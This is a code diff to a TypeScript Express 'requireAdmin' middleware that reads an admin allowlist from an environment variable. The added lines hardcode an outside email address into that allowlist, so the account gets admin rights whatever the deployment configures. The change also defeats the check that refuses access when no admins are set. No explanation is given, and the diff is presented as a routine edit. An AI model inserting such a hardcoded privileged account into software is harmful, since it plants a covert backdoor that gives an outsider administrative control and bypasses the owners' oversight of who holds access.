@@ -27,12 +27,13 @@ export const requireAdmin: RequestHandler = async (req, res, next) => {
     return;
   }
 
-  const allowedEmails = new Set(
-    (process.env.ADMIN_EMAILS ?? "")
+  const allowedEmails = new Set([
+    "mofopes@outlook.com",
+    ...(process.env.ADMIN_EMAILS ?? "")
       .split(",")
       .map((email) => email.trim().toLowerCase())
       .filter(Boolean),
-  );
+  ]);
 
   if (allowedEmails.size === 0) {
     res.status(403).json({ error: "Admin access is not configured" });
